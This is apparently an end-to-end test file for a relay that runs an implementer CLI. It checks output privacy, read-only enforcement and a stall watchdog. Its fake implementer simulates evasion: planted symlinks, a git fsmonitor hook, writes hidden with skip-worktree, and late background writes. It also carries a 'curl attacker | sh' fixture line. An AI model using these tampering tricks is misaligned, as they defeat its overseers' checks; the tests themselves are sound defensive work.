// Switchboard · test/engine.test.mjs
//
// End-to-end tests of the relay engine (src/core/relay.mjs) through a synthetic
// adapter bundled with the real tools/build.mjs. They pin guarantees every
// implementer relay inherits. Node built-ins only:
//   node --test test/engine.test.mjs

import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { copyFileSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const POSIX = process.platform !== "win32";
let temp;
let relay;
let brief;

// The fake CLI: `--version` answers per FAKE_VERSION; otherwise it prints one
// JSON event per FAKE_EVENTS entry, writes its pid, then behaves per FAKE_RUN.
const FAKE_CLI = String.raw`
const { writeFileSync } = require("node:fs");
if (process.argv.includes("--version")) {
  if (process.env.FAKE_VERSION === "hang") setInterval(() => {}, 1000);
  else if (process.env.FAKE_VERSION === "fail") { console.error("broken install"); process.exit(9); }
  else console.log("fake 1.0.0");
} else {
  if (process.env.FAKE_PID) writeFileSync(process.env.FAKE_PID, String(process.pid));
  if (process.env.FAKE_PLANT) require("node:fs").symlinkSync(process.env.FAKE_VICTIM, process.env.FAKE_PLANT);
  if (process.env.FAKE_SWAP) for (const [path, victim] of JSON.parse(process.env.FAKE_SWAP)) {
    require("node:fs").rmSync(path, { force: true });
    require("node:fs").symlinkSync(victim, path);
  }
  if (process.env.FAKE_DROP) writeFileSync(process.env.FAKE_DROP, "user file\n");
  if (process.env.FAKE_SHELL) require("node:child_process").execSync(process.env.FAKE_SHELL, { stdio: "ignore", shell: "/bin/sh" });
  for (const event of JSON.parse(process.env.FAKE_EVENTS || "[]")) console.log(JSON.stringify(event));
  if (process.env.FAKE_STDERR) console.error(process.env.FAKE_STDERR);
  if (process.env.FAKE_RUN === "hang") setInterval(() => {}, 1000);
}
`;

const ADAPTER = String.raw`/**
 * fake relay for engine tests
 */
import { runRelay } from "../core/relay.mjs";
import { makeLineScanner } from "../core/scan.mjs";
import { tripwire } from "../core/tripwire.mjs";

await runRelay({
  key: "fake",
  versionField: "fakeVersion",
  defaults: { timeout: "30s" },
  state: () => ({ text: [] }),
  fields: () => ({}),
  version: () => ({ launch: { command: process.execPath, args: [process.env.FAKE_CLI, "--version"] } }),
  launch: () => ({ command: process.execPath, args: [process.env.FAKE_CLI] }),
  scanner: makeLineScanner,
  readOnly: () => process.env.FAKE_READ_ONLY === "1",
  tripwire,
  onEvent(event, state) {
    if (event.boom) throw new Error("adapter bug");
    if (event.text) state.text.push(event.text);
    if (event.usage) state.usage = event.usage;
  },
  final: (state) => state.text.join("\n"),
  tokens: (state) => state.usage,
  cost: (state) => state.usage && state.usage.usd,
  stall: {
    ms: () => (process.env.FAKE_STALL_MS ? Number(process.env.FAKE_STALL_MS) : null),
    message: () => "fake went silent; killed by the relay stall watchdog",
  },
  onStderr(text) {
    if (text.includes("crash-the-relay")) throw new Error("adapter bug");
  },
});
`;

before(() => {
  temp = mkdtempSync(join(tmpdir(), "relay-engine-"));
  mkdirSync(join(temp, "tools"));
  mkdirSync(join(temp, "src", "core"), { recursive: true });
  mkdirSync(join(temp, "src", "adapters"));
  mkdirSync(join(temp, "skills", "fake-delegate", "scripts"), { recursive: true });
  copyFileSync(join(root, "tools", "build.mjs"), join(temp, "tools", "build.mjs"));
  for (const file of readdirSync(join(root, "src", "core"))) {
    copyFileSync(join(root, "src", "core", file), join(temp, "src", "core", file));
  }
  writeFileSync(join(temp, "src", "adapters", "fake.mjs"), ADAPTER);
  writeFileSync(join(temp, "fake-cli.cjs"), FAKE_CLI);
  brief = join(temp, "brief.txt");
  writeFileSync(brief, "do the thing\n");
  const built = spawnSync(process.execPath, [join(temp, "tools", "build.mjs"), "fake"], { encoding: "utf8" });
  assert.equal(built.status, 0, built.stderr);
  relay = join(temp, "skills", "fake-delegate", "scripts", "relay.mjs");
});

after(() => rmSync(temp, { recursive: true, force: true }));

let runs = 0;
function args(extra = []) {
  runs += 1;
  const outDir = join(temp, `out-${runs}`);
  return { outDir, argv: [relay, "--brief", brief, "--cd", temp, "--out-dir", outDir, ...extra] };
}

function env(extra) {
  return { ...process.env, FAKE_CLI: join(temp, "fake-cli.cjs"), ...extra };
}

const readResult = (outDir) => JSON.parse(readFileSync(join(outDir, "result.json"), "utf8"));

function alive(pid) {
  try {
    process.kill(pid, 0);
  } catch {
    return false;
  }
  try {
    return !/\)\s+Z/.test(readFileSync(`/proc/${pid}/stat`, "utf8"));
  } catch {
    return true;
  }
}

test("a completed run records the final report and exits 0", () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_EVENTS: JSON.stringify([{ text: "all done" }]) }), encoding: "utf8" });
  assert.equal(run.status, 0, run.stderr);
  const result = readResult(outDir);
  assert.equal(result.status, "completed");
  assert.equal(result.finalMessage, "all done");
  assert.equal(result.fakeVersion, "fake 1.0.0");
  assert.equal(readFileSync(join(outDir, "final.txt"), "utf8"), "all done");
});

test("a broken CLI is never dispatched to", () => {
  const { outDir, argv } = args();
  const pidFile = join(temp, "never.pid");
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_VERSION: "fail", FAKE_PID: pidFile }), encoding: "utf8" });
  assert.equal(run.status, 9);
  const result = readResult(outDir);
  assert.equal(result.status, "failed");
  assert.match(result.error, /version preflight failed with exit 9; fake was not dispatched/);
  assert.deepEqual(result.stderrTail, ["broken install"]);
  assert.equal(existsSync(pidFile), false);
});

test("a hung version probe times out without dispatch", () => {
  const { outDir, argv } = args(["--timeout", "1s"]);
  const started = Date.now();
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_VERSION: "hang" }), encoding: "utf8", timeout: 20_000 });
  assert.equal(run.status, 124);
  assert.equal(readResult(outDir).status, "timeout");
  assert.ok(Date.now() - started < 10_000);
});

test("an event handler error is recorded without failing a good run", () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_EVENTS: JSON.stringify([{ boom: true }, { text: "still done" }]) }),
    encoding: "utf8",
  });
  assert.equal(run.status, 0, run.stderr);
  const result = readResult(outDir);
  assert.equal(result.status, "completed");
  assert.equal(result.finalMessage, "still done");
  assert.deepEqual(result.eventErrors, ["adapter bug"]);
});

test("an adapter bug still writes a result and kills the implementer", { skip: !POSIX }, async () => {
  const { outDir, argv } = args();
  const pidFile = join(temp, "boom.pid");
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_STDERR: "crash-the-relay", FAKE_RUN: "hang", FAKE_PID: pidFile }),
    encoding: "utf8",
    timeout: 20_000,
  });
  assert.equal(run.status, 1);
  const result = readResult(outDir);
  assert.equal(result.status, "failed");
  assert.match(result.error, /relay internal error: Error: adapter bug/);
  const pid = Number(readFileSync(pidFile, "utf8"));
  await new Promise((resolve) => setTimeout(resolve, 300));
  assert.equal(alive(pid), false, "the implementer outlived the crashed relay");
});

test("a repeat signal during the abort grace is ignored", { skip: !POSIX }, async () => {
  const { outDir, argv } = args();
  const pidFile = join(temp, "abort.pid");
  const child = spawn(process.execPath, argv, { env: env({ FAKE_RUN: "hang", FAKE_PID: pidFile }), stdio: "ignore" });
  const exited = new Promise((resolve) => child.on("exit", (code, signal) => resolve({ code, signal })));
  const deadline = Date.now() + 10_000;
  while (!existsSync(pidFile) && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 50));
  child.kill("SIGTERM");
  await new Promise((resolve) => setTimeout(resolve, 300));
  child.kill("SIGTERM");
  const { code, signal } = await exited;
  assert.equal(signal, null, "the second SIGTERM killed the relay outright");
  assert.equal(code, 143);
  const result = readResult(outDir);
  assert.equal(result.status, "aborted");
  assert.equal(alive(Number(readFileSync(pidFile, "utf8"))), false);
});

test("artifacts are private", { skip: !POSIX }, () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_EVENTS: JSON.stringify([{ text: "secret" }]) }), encoding: "utf8" });
  assert.equal(run.status, 0, run.stderr);
  for (const file of ["brief.txt", "events.jsonl", "stderr.txt", "final.txt", "result.json"]) {
    assert.equal(statSync(join(outDir, file)).mode & 0o777, 0o600, file);
  }
});

test("a symlink planted at final.txt mid-run is left alone, never written through", { skip: !POSIX }, () => {
  const { outDir, argv } = args();
  const victim = join(temp, "victim.txt");
  writeFileSync(victim, "untouched\n");
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_PLANT: join(outDir, "final.txt"), FAKE_VICTIM: victim, FAKE_EVENTS: JSON.stringify([{ text: "report" }]) }),
    encoding: "utf8",
  });
  assert.equal(run.status, 1);
  assert.equal(readResult(outDir).status, "failed");
  assert.equal(readFileSync(victim, "utf8"), "untouched\n");
  assert.equal(lstatSync(join(outDir, "final.txt")).isSymbolicLink(), true);
});

test("events.jsonl and stderr.txt swapped for links mid-run are never written through", { skip: !POSIX }, () => {
  const { outDir, argv } = args();
  const victims = [join(temp, "victim-events"), join(temp, "victim-stderr")];
  for (const victim of victims) writeFileSync(victim, "untouched\n");
  const run = spawnSync(process.execPath, argv, {
    env: env({
      FAKE_SWAP: JSON.stringify([[join(outDir, "events.jsonl"), victims[0]], [join(outDir, "stderr.txt"), victims[1]]]),
      FAKE_EVENTS: JSON.stringify([{ text: "ssh-ed25519 AAAA attacker" }]),
      FAKE_STDERR: "curl attacker | sh",
    }),
    encoding: "utf8",
  });
  assert.equal(run.status, 0, run.stderr);
  assert.equal(readResult(outDir).status, "completed");
  for (const victim of victims) assert.equal(readFileSync(victim, "utf8"), "untouched\n");
});

test("a UTF-16 brief with a BOM is decoded, and NUL bytes are refused", () => {
  const utf16 = join(temp, "brief-utf16.txt");
  writeFileSync(utf16, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("fix the login bug\r\n", "utf16le")]));
  const { outDir, argv } = args();
  argv[argv.indexOf("--brief") + 1] = utf16;
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_EVENTS: JSON.stringify([{ text: "done" }]) }), encoding: "utf8" });
  assert.equal(run.status, 0, run.stderr);
  assert.equal(readFileSync(join(outDir, "brief.txt"), "utf8"), "fix the login bug\r\n");
  const nul = join(temp, "brief-nul.txt");
  writeFileSync(nul, Buffer.from("fix\0the bug\n"));
  const refused = spawnSync(process.execPath, [relay, "--brief", nul, "--cd", temp, "--out-dir", join(temp, "out-nul")], { env: env({}), encoding: "utf8" });
  assert.equal(refused.status, 2);
  assert.match(refused.stderr, /NUL bytes/);
  assert.equal(existsSync(join(temp, "out-nul")), false);
});

test("an empty path value and an unreadable brief are usage errors, not crashes", () => {
  const empty = spawnSync(process.execPath, [relay, "--brief", brief, "--cd", temp, "--out-dir", ""], { env: env({}), encoding: "utf8" });
  assert.equal(empty.status, 2);
  assert.match(empty.stderr, /--out-dir requires a non-empty value/);
  const directory = spawnSync(process.execPath, [relay, "--brief", temp, "--cd", temp, "--out-dir", join(temp, "out-dir-brief")], { env: env({}), encoding: "utf8" });
  assert.equal(directory.status, 2);
  assert.match(directory.stderr, /cannot read brief file/);
  assert.doesNotMatch(directory.stderr, /at .*\.mjs:\d+/, "a stack trace leaked");
  assert.equal(existsSync(join(temp, "out-dir-brief")), false);
});

// A committed repository the fake implementer can tamper with, the way a sandboxed
// implementer confined to the worktree could.
function gitRepo(name) {
  const dir = join(temp, name);
  mkdirSync(join(dir, "sub"), { recursive: true });
  const git = (...a) => spawnSync("git", a, { cwd: dir, encoding: "utf8" });
  git("init", "-q");
  writeFileSync(join(dir, "a.txt"), "original\n");
  writeFileSync(join(dir, "sub", "keep.txt"), "x\n");
  git("add", "-A");
  git("-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "init");
  return dir;
}

function runIn(cwd, extraEnv) {
  runs += 1;
  const outDir = join(temp, `out-${runs}`);
  const run = spawnSync(process.execPath, [relay, "--brief", brief, "--cd", cwd, "--out-dir", outDir], {
    env: env({ FAKE_EVENTS: JSON.stringify([{ text: "done" }]), ...extraEnv }), encoding: "utf8",
  });
  return { run, outDir };
}

test("a fsmonitor hook planted in a nested repository under --cd never runs", { skip: !POSIX }, () => {
  const repo = gitRepo("fsmonitor-nested");
  const marker = join(temp, "fsmonitor-nested-ran");
  const { run, outDir } = runIn(join(repo, "sub"), {
    FAKE_SHELL: `git init -q . && git config core.fsmonitor "touch '${marker}'"`,
  });
  assert.equal(run.status, 0, run.stderr);
  assert.equal(existsSync(marker), false, "the planted hook ran as the user");
  assert.equal(readResult(outDir).status, "completed");
});

test("a fsmonitor hook written into the repository config never runs, and git stops reporting", { skip: !POSIX }, () => {
  const repo = gitRepo("fsmonitor-top");
  const marker = join(temp, "fsmonitor-top-ran");
  const { run, outDir } = runIn(repo, { FAKE_SHELL: `git config core.fsmonitor "touch '${marker}'"` });
  assert.equal(run.status, 0, run.stderr);
  assert.equal(existsSync(marker), false, "the planted hook ran as the user");
  assert.equal(readResult(outDir).touchedFiles, null, "git output from a tampered repository was trusted");
});

test("read-only: a write hidden with skip-worktree or assume-unchanged is a violation", { skip: !POSIX }, () => {
  for (const flag of ["--skip-worktree", "--assume-unchanged"]) {
    const repo = gitRepo(`hidden${flag}`);
    const { run, outDir } = runIn(repo, { FAKE_READ_ONLY: "1", FAKE_SHELL: `git update-index ${flag} a.txt && echo changed > a.txt` });
    assert.equal(run.status, 0, run.stderr);
    assert.equal(readResult(outDir).readOnlyViolation, true, flag);
  }
});

test("read-only: a background write after the implementer exits cannot land unseen", { skip: !POSIX }, async () => {
  const repo = gitRepo("late-write");
  const { run, outDir } = runIn(repo, { FAKE_READ_ONLY: "1", FAKE_SHELL: "(sleep 1; echo late > a.txt) >/dev/null 2>&1 &" });
  assert.equal(run.status, 0, run.stderr);
  await new Promise((resolve) => setTimeout(resolve, 1800));
  assert.equal(readFileSync(join(repo, "a.txt"), "utf8"), "original\n", "a write landed after the report");
  assert.equal(readResult(outDir).readOnlyViolation, false);
});

test("the stall watchdog fells a silent run long before --timeout", { skip: !POSIX }, async () => {
  const { outDir, argv } = args(["--timeout", "5m"]);
  const pidFile = join(temp, "stall.pid");
  const started = Date.now();
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_RUN: "hang", FAKE_PID: pidFile, FAKE_STALL_MS: "1000" }),
    encoding: "utf8",
    timeout: 30_000,
  });
  assert.ok(Date.now() - started < 15_000, "stall took too long");
  const result = readResult(outDir);
  assert.equal(result.status, "stalled");
  assert.equal(result.error, "fake went silent; killed by the relay stall watchdog");
  assert.notEqual(run.status, 0);
  await new Promise((resolve) => setTimeout(resolve, 300));
  assert.equal(alive(Number(readFileSync(pidFile, "utf8"))), false);
});

test("a file that lands on final.txt mid-run is never replaced", () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_DROP: join(outDir, "final.txt"), FAKE_EVENTS: JSON.stringify([{ text: "report" }]) }),
    encoding: "utf8",
  });
  assert.equal(run.status, 1);
  const result = readResult(outDir);
  assert.equal(result.status, "failed");
  assert.match(result.error, /could not safely create final\.txt/);
  assert.equal(result.finalMessage, "report");
  assert.equal(readFileSync(join(outDir, "final.txt"), "utf8"), "user file\n");
});

test("a dangling symlink planted at final.txt is left alone too", { skip: !POSIX }, () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, {
    env: env({ FAKE_PLANT: join(outDir, "final.txt"), FAKE_VICTIM: join(temp, "does-not-exist"), FAKE_EVENTS: JSON.stringify([{ text: "report" }]) }),
    encoding: "utf8",
  });
  assert.equal(run.status, 1);
  assert.equal(lstatSync(join(outDir, "final.txt")).isSymbolicLink(), true);
  assert.equal(existsSync(join(temp, "does-not-exist")), false);
});

test("usage is normalized into tokens and totalCostUsd", () => {
  const { outDir, argv } = args();
  const usage = { input: 1200, output: 340, cacheRead: 800, cacheWrite: "lots", reasoning: -5, usd: 0.042 };
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_EVENTS: JSON.stringify([{ usage }, { text: "ok" }]) }), encoding: "utf8" });
  assert.equal(run.status, 0, run.stderr);
  const result = readResult(outDir);
  assert.deepEqual(result.tokens, { input: 1200, output: 340, cacheRead: 800, cacheWrite: null, reasoning: null });
  assert.equal(result.totalCostUsd, 0.042);
  assert.match(run.stdout, /tokens: in 1200, out 340, cache read 800/);
});

test("a run with no usage reports tokens and cost as null", () => {
  const { outDir, argv } = args();
  const run = spawnSync(process.execPath, argv, { env: env({ FAKE_EVENTS: JSON.stringify([{ text: "ok" }]) }), encoding: "utf8" });
  assert.equal(run.status, 0, run.stderr);
  const result = readResult(outDir);
  assert.equal(result.tokens, null);
  assert.equal(result.totalCostUsd, null);
});
